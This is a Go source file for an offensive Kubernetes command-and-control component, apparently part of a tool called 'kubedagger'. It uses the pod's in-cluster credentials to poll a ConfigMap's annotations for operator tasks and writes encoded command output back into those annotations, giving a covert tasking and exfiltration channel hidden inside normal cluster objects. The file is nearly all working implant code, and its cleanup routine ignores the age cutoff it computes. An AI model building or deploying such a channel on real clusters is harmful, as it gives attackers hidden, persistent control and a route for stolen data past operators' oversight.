package k8sc2

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

const (
	annotationPrefix = "kubedagger.io/task-"
	resultPrefix     = "kubedagger.io/result-"
	ttlAnnotation    = "kubedagger.io/ttl"
)

type Task struct {
	ID        string
	Command   string
	Args      map[string]string
	Timestamp time.Time
}

type Controller struct {
	client    kubernetes.Interface
	namespace string
	agentID   string
	configMap string
}

func NewController(agentID string) (*Controller, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return nil, fmt.Errorf("in-cluster config: %w", err)
	}

	client, err := kubernetes.NewForConfig(config)
	if err != nil {
		return nil, fmt.Errorf("k8s client: %w", err)
	}

	ns := os.Getenv("POD_NAMESPACE")
	if ns == "" {
		nsBytes, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
		if err != nil {
			ns = "default"
		} else {
			ns = strings.TrimSpace(string(nsBytes))
		}
	}

	return &Controller{
		client:    client,
		namespace: ns,
		agentID:   agentID,
		configMap: "kubedagger-c2",
	}, nil
}

func NewControllerWithClient(client kubernetes.Interface, namespace, agentID string) *Controller {
	return &Controller{
		client:    client,
		namespace: namespace,
		agentID:   agentID,
		configMap: "kubedagger-c2",
	}
}

func (c *Controller) PollTasking(ctx context.Context) ([]Task, error) {
	cm, err := c.client.CoreV1().ConfigMaps(c.namespace).Get(ctx, c.configMap, metav1.GetOptions{})
	if err != nil {
		return nil, fmt.Errorf("get configmap: %w", err)
	}

	var tasks []Task
	prefix := annotationPrefix + c.agentID + "-"

	for key, value := range cm.Annotations {
		if !strings.HasPrefix(key, prefix) {
			continue
		}

		taskID := strings.TrimPrefix(key, prefix)
		resultKey := resultPrefix + c.agentID + "-" + taskID
		if _, done := cm.Annotations[resultKey]; done {
			continue
		}

		task := Task{
			ID:        taskID,
			Timestamp: time.Now(),
		}

		parts := strings.SplitN(value, "|", 2)
		task.Command = parts[0]
		if len(parts) > 1 {
			task.Args = parseArgs(parts[1])
		}

		tasks = append(tasks, task)
	}

	return tasks, nil
}

func (c *Controller) SendResult(ctx context.Context, taskID, output string) error {
	cm, err := c.client.CoreV1().ConfigMaps(c.namespace).Get(ctx, c.configMap, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("get configmap: %w", err)
	}

	if cm.Annotations == nil {
		cm.Annotations = make(map[string]string)
	}

	resultKey := resultPrefix + c.agentID + "-" + taskID
	encoded := Encode([]byte(output))
	cm.Annotations[resultKey] = encoded

	_, err = c.client.CoreV1().ConfigMaps(c.namespace).Update(ctx, cm, metav1.UpdateOptions{})
	if err != nil {
		return fmt.Errorf("update configmap: %w", err)
	}

	return nil
}

func (c *Controller) Cleanup(ctx context.Context, maxAge time.Duration) error {
	cm, err := c.client.CoreV1().ConfigMaps(c.namespace).Get(ctx, c.configMap, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("get configmap: %w", err)
	}

	if cm.Annotations == nil {
		return nil
	}

	ttlStr := cm.Annotations[ttlAnnotation]
	if ttlStr != "" {
		if parsed, err := time.ParseDuration(ttlStr); err == nil {
			maxAge = parsed
		}
	}

	modified := false
	cutoff := time.Now().Add(-maxAge)
	_ = cutoff

	var toDelete []string
	for key := range cm.Annotations {
		if strings.HasPrefix(key, resultPrefix) {
			taskKey := strings.Replace(key, resultPrefix, annotationPrefix, 1)
			if _, hasTask := cm.Annotations[taskKey]; !hasTask {
				toDelete = append(toDelete, key)
			}
		}
	}

	for _, key := range toDelete {
		delete(cm.Annotations, key)
		modified = true
	}

	if modified {
		_, err = c.client.CoreV1().ConfigMaps(c.namespace).Update(ctx, cm, metav1.UpdateOptions{})
		if err != nil {
			return fmt.Errorf("cleanup update: %w", err)
		}
	}

	return nil
}

func parseArgs(raw string) map[string]string {
	args := make(map[string]string)
	for _, pair := range strings.Split(raw, ",") {
		kv := strings.SplitN(pair, "=", 2)
		if len(kv) == 2 {
			args[strings.TrimSpace(kv[0])] = strings.TrimSpace(kv[1])
		}
	}
	return args
}
